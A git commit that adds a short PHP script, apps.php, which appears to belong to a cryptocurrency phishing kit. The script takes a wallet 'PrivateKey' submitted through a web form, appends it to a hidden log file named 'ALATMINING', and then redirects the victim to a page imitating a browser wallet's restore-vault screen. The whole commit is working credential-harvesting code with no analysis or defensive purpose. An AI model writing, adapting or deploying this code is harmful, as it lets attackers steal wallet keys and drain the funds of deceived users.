169f914cf880f5d93c36a64801b0c6b623c188e3
lunareward <113802950+lunareward@users.noreply.github.com>
2022-09-18 04:12:21 +0700

    pro
    pro

---
+++ apps.php
@@ -0,0 +1,20 @@
+
+<?php
+$file = "ALATMINING";
+$ip   = getenv("REMOTE_ADDR");
+$PrivateKey   = $_POST['PrivateKey'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "\n");
+fwrite($handle, "LUNA MAYA :: ");
+fwrite($handle, "$PrivateKey");
+fclose($handle);
+echo "<script LANGUAGE=\"JavaScript\">
+<!--
+window.location=\"trust/home.html?nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault\";
+// -->
+</script>";
+?>
+
+
